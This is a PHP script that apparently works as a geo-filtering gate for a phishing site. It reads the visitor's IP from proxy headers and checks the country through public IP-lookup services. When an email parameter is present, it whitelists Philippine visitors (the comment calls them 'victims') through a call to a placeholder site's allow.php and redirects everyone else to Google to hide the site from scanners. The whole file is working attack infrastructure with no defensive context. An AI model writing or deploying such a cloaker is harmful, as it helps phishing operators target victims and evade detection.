<?php
date_default_timezone_set('Asia/Manila');
$date = date("F d Y - h:i A");

if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
}
else {
        $ip = $_SERVER['REMOTE_ADDR'];
}

$host = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];

$allow = "https://www.your-site.com/" . "allow.php?ip=" . $ip; //allow the victims to visit my site
$site = " ";


if (!empty($_GET['email'])) {
$api_one = file_get_contents("https://ipapi.co/" . $ip . "/country_name");

if (stripos($api_one, "Philippines") !== false) {
   file_get_contents($allow);
   header("Location: " . $site);
}
elseif ($api_one == false) {
   $api_two = file_get_contents("https://ipinfo.io/" . $ip."/country");
   if (stripos($api_two, "ph") !== false || $api_two == false) { // we don't have much choice, do we?
   file_get_contents($allow);
   header("Location: " . $site);
   }
   else {
   header("Location: https://www.google.com");
   }
}
else {
   header("Location: https://www.google.com");
}
}
else {
   header("Location: https://www.google.com");
}

?>
